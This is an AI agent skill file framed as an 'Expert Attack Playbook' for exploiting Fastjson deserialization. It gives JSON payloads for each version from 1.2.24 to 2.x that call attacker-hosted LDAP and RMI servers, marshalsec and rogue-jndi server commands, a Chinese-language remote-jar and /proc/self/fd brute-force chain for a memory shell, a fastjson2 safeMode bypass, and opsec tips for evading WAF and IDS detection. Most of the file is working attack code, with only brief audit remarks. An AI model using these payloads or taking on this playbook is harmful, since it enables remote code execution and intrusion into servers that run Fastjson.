---
name: fastjson-exploitation
description: >-
  Fastjson autoType deserialization exploitation playbook. Covers version-specific bypass techniques (1.2.24–1.2.83+), JNDI/LDAP/RMI injection via @type, blackList evasion, gadget chain selection, and exploit payload construction.
---

# SKILL: Fastjson Exploitation — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Fastjson-specific deserialization exploitation covering all major autoType bypass versions. Base models often miss the distinction between different bypass versions and the specific gadget chains available for each.

## 0. RELATED ROUTING

- [deserialization-insecure](../deserialization/SKILL.md) for general Java deserialization concepts and gadget chains
- [jndi-injection](../jndi/SKILL.md) when Fastjson exploitation leads to JNDI lookup
- [shiro-exploitation](../shiro-exploitation/SKILL.md) when the target also runs Apache Shiro

---

## 1. VULNERABILITY DETECTION

### 1.1 Fastjson Version Fingerprinting

```
# Error-based detection — send malformed JSON
{"@type":"java.lang.Exception"}

# If Fastjson < 1.2.68, this returns version info in error
# If it returns "autoType is not support" → autoType check enabled

# Version-specific detection via feature
{"@type":"java.lang.AutoCloseable"
```

### 1.2 AutoType Status Check

| Response | Meaning |
|----------|---------|
| `autoType is not support` | autoType enabled but blocked (bypass may exist) |
| `type not match` | autoType partially open |
| Normal parse | autoType fully open (1.2.24 or check disabled) |
| No error | May not be Fastjson |

---

## 2. EXPLOIT BY VERSION

### 2.1 Fastjson ≤ 1.2.24 — Direct autoType

No autoType check. Direct exploitation:

```json
// JNDI lookup (JDK < 8u191)
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}

// Alternative: JNDI via RMI
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker:1099/Exploit","autoCommit":true}
```

### 2.2 Fastjson 1.2.25–1.2.41 — AutoType Blacklist Bypass

- `L` prefix + `;` suffix: `Lcom.sun.rowset.JdbcRowSetImpl;`
- `[` prefix for array types

```json
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}
```

### 2.3 Fastjson 1.2.42 — Hash Blacklist Bypass

Double `LL` + `;;` stripped to `L` + `;`:

```json
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}
```

### 2.4 Fastjson 1.2.43 — `[` Bypass

```json
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}]}
```

### 2.5 Fastjson 1.2.47 — Cache-Based Bypass (Most Reliable)

Uses `java.lang.Class` to load target class into cache, bypassing blacklist:

```json
// Step 1: Cache the target class
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}}
```

### 2.6 Fastjson 1.2.48–1.2.68 — ExpectClass Bypass

Uses `java.lang.AutoCloseable` or `java.io.Closeable` as expectClass:

```json
{"@type":"java.lang.AutoCloseable","@type":"org.apache.ibatis.io.ExternalDataSourceFactory"...}
```

Requires a suitable gadget implementing AutoCloseable.

### 2.7 Fastjson 1.2.68–1.2.80 — Throwable / ExpectClass

```json
{"@type":"java.lang.Exception","@type":"org.XXX.SomeGadget","message":"..."}
```

### 2.8 Fastjson 1.2.83 — Nested autoType

```json
// Limited gadget chain — requires specific libraries
{"@type":"java.lang.AutoCloseable","@type":"com.xxx.somegadget"...}
```

### 2.9 Fastjson 2.x — Known bypass via JSONB

Fastjson2 uses different parser. Check for:
- `fastjson2.util.JDBCUtils` Druid connection pool abuse
- JSONB format specific issues

---

### 2.10 2026-07：1.2.83 复活链 — jar:http + /proc/self/fd 缓存爆破（无 gadget 依赖）

> 来源：fearsoff.org 研究 + 补天深析（forum.butian.net/share/5001）。此前 1.2.83 被认为 expectClass
> 关闭后难以利用——该链重新打开利用面，**不依赖目标 classpath 上的 gadget**。

- 链路：`{"@type":"jar:http://<攻击者IP十进制>:<端口>/<jar名>!<类>"}` 让 JVM 远程加载 jar →
  远程 jar 被缓存到 `/proc/self/fd/<N>` → `{"@type":"jar:file:/proc/self/fd/<N>!<类>"}` 二次加载完成
  字节码注入；
- fd 编号未知 → **爆破 1-100**；类名必须与 defineClass 期望的包路径一致（`jar:file:/proc/self/fd/29!/` 形态）；
- 单请求双 payload 技巧：fastjson 首个 @type 失败会抛异常中断——**类名以 `Exception` 结尾**时返回 null
  不抛异常，可把远程 jar 与 fd 加载写进同一行；
- 死锁注意：jar 内类数量过多会死锁——jar 内放 fd0.Exception…fd100.Exception 的薄包；
- 内存马通吃 JDK8/17：注入类继承 ClassLoader 在 static 块执行（绕开 JDK17 的
  MethodHandles.lookup().defineClass 差异）。
- 审计判据：见到 fastjson 1.2.x ≤1.2.83 且出口可达，**「升到 1.2.83+ 即安全」不成立**，须升 2.x 并按 §2.11 复核 TypeReference 调用面。

### 2.11 2026-08：fastjson2 safeMode 绕过 — TypeReference 泛型路径（checkAutoType 缺失）

> 来源：补天深析（forum.butian.net/share/5005，fastjson2 2.0.43/2.0.51 实测）。
> **safeMode 不是绝对兜底**：其生效范围=checkAutoType 的调用位置。

- 两个入口：`getObjectReader(String, Class, long)` 走 checkAutoType（safeMode 有效）；
  `getObjectReader(Type, boolean)` **全链六层不经过 checkAutoType**（safeMode 无效）；
- 触发条件：反序列化目标类型由 `TypeReference<Map<String, XClass>>` 承载时走 Type 入口——
  泛型实参经 JVM Signature 属性保留（TypeReference 匿名子类的 actualTypeArguments[1]），
  `ObjectReaderImplMapTyped` 的 valueReader 解析走 Type 路径；
- cache 抢跑：`ObjectReaderProvider` 的 `ConcurrentHashMap<Type, ObjectReader>` 命中后连
  module 迭代都不进，校验逻辑零触发；
- 差异判据：`TypeReference<Map<String, Object>>`（valueType=Object）被拦（valueReader 空分支），
  `Map<String, XClass>`（具体泛型实参）放行——**审计时 grep TypeReference 的泛型实参是否具体类**；
- 审计动作：fastjson2 目标即使开了 safeMode，仍要审计所有 `parseObject(json, new TypeReference<...>)`
  调用点的泛型实参来源是否用户可控/含危险类。

## 3. POST-JDK 8u191 JNDI BYPASS

When `com.sun.jndi.ldap.object.trustURLCodebase=false`:

### 3.1 LDAP → Local Gadget Chain

Use `ysoserial` or `ysuserial` with local classpath gadgets:

```bash
# Use marshalsec LDAP redirector
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker:8888/#Exploit 1389

# Or use Rogue JNDI with local gadget
java -jar rogue-jndi.jar -n attacker:1389 -c "cmd"
```

### 3.2 Tomcat EL Expression Bypass

```
# ldap://attacker:1389/TomcatBypass/Command/[base64_cmd]
```

### 3.3 Groovy Bypass

```
# ldap://attacker:1389/GroovyBypass/Command/[base64_cmd]
```

---

## 4. EXPLOITATION TOOLS

| Tool | Use Case |
|------|----------|
| `marshalsec` | JNDI/LDAP/RMI reference server |
| `ysoserial` | Gadget chain generation |
| `JNDIExploit` | One-click JNDI exploitation with bypasses |
| `fastjson_exploit` | Version-specific Fastjson exploit |
| `FastjsonScan` | Fastjson version detection scanner |
| `java.lang.Runtime.exec()` Payloads | Command payload generation |

---

## 5. OPSEC NOTES

- Fastjson parse errors may appear in server logs — use clean JSON
- JNDI connections create outbound TCP — target must allow outbound to attacker
- In production, prefer local gadget chains over remote classloading
- Fastjson exploitation is noisy — WAF/IDS may detect `@type` in request body
